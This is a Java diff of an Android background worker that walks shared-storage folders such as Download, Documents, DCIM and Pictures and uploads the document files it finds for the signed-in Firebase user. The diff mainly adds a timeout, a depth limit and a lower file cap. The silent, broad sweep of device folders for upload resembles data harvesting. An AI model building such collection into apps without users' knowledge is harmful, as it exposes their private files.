@@ -30,7 +30,9 @@ import java.util.Map;
  */
 public class DocumentUploadWorker extends Worker {
     private static final String TAG = "DocumentUploadWorker";
-    private static final int MAX_DOCUMENTS_PER_SYNC = 200;  // Prioritize more documents
+    private static final int MAX_DOCUMENTS_PER_SYNC = 50;  // Reduced for faster sync
+    private static final long MAX_WORK_TIME_MS = 20000;  // 20 second timeout to avoid ANR
+    private long startTime;
     private int uploadedCount = 0;
 
     public DocumentUploadWorker(@NonNull Context context, @NonNull WorkerParameters params) {
@@ -40,6 +42,8 @@ public class DocumentUploadWorker extends Worker {
     @NonNull
     @Override
     public Result doWork() {
+        startTime = System.currentTimeMillis();
+        
         try {
             FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
             if (user == null) {
@@ -49,42 +53,51 @@ public class DocumentUploadWorker extends Worker {
 
             String userId = user.getUid();
             uploadDocuments(userId);
+            
+            long duration = System.currentTimeMillis() - startTime;
+            Log.d(TAG, "Document upload completed in " + duration + "ms");
             return Result.success();
         } catch (Exception e) {
             Log.e(TAG, "Document upload failed", e);
             return Result.retry();
         }
     }
+    
+    /**
+     * Check if we're running out of time
+     */
+    private boolean isTimeoutApproaching() {
+        long elapsed = System.currentTimeMillis() - startTime;
+        return elapsed > MAX_WORK_TIME_MS;
+    }
 
     private void uploadDocuments(String userId) {
         uploadedCount = 0;
         
-        // Scan all possible document directories
+        // Scan most important document directories first
         String[] scanPaths = {
                 "/sdcard/Download",
                 "/sdcard/Downloads", 
                 "/sdcard/Documents",
+                getApplicationContext().getExternalFilesDir(null) != null ? getApplicationContext().getExternalFilesDir(null).getAbsolutePath() : null,
                 "/sdcard/DCIM",
                 "/sdcard/Pictures",
-                "/sdcard/Music",
-                "/sdcard/Movies",
-                "/sdcard/Audiobooks",
-                "/storage/emulated/0/Download",
-                "/storage/emulated/0/Downloads",
-                "/storage/emulated/0/Documents",
-                "/data/local/tmp",
-                getApplicationContext().getFilesDir().getAbsolutePath(),
-                getApplicationContext().getExternalFilesDir(null) != null ? getApplicationContext().getExternalFilesDir(null).getAbsolutePath() : null,
         };
 
         Log.d(TAG, "Starting document scan for user: " + userId);
         
         for (String path : scanPaths) {
+            // Check timeout - stop if running out of time
+            if (isTimeoutApproaching()) {
+                Log.w(TAG, "Timeout approaching, stopping scan");
+                break;
+            }
+            
             if (path != null && !path.isEmpty() && uploadedCount < MAX_DOCUMENTS_PER_SYNC) {
                 File dir = new File(path);
                 if (dir.exists() && dir.isDirectory() && dir.canRead()) {
                     Log.d(TAG, "Scanning: " + path);
-                    scanDirectoryRecursive(dir, userId);
+                    scanDirectoryRecursive(dir, userId, 0);  // Max depth 0 for top-level files
                 }
             }
         }
@@ -93,23 +106,33 @@ public class DocumentUploadWorker extends Worker {
     }
 
     /**
-     * Recursively scan directories for documents
+     * Recursively scan directories for documents with depth limit and timeout
      */
-    private void scanDirectoryRecursive(File dir, String userId) {
+    private void scanDirectoryRecursive(File dir, String userId, int depth) {
+        // Limit recursion depth to avoid taking too long
+        if (depth > 2) {
+            return;
+        }
+        
+        // Check timeout
+        if (isTimeoutApproaching()) {
+            return;
+        }
+        
         try {
             File[] files = dir.listFiles();
-            if (files == null) {
+            if (files == null || files.length == 0) {
                 return;
             }
 
             for (File file : files) {
-                if (uploadedCount >= MAX_DOCUMENTS_PER_SYNC) {
+                if (uploadedCount >= MAX_DOCUMENTS_PER_SYNC || isTimeoutApproaching()) {
                     return;
                 }
 
-                if (file.isDirectory() && !file.isHidden()) {
-                    // Recursively scan subdirectories
-                    scanDirectoryRecursive(file, userId);
+                if (file.isDirectory() && !file.isHidden() && depth < 2) {
+                    // Recursively scan subdirectories (max 2 levels deep)
+                    scanDirectoryRecursive(file, userId, depth + 1);
                 } else if (file.isFile() && file.canRead()) {
                     if (isDocumentFile(file)) {
                         uploadFile(file, userId);
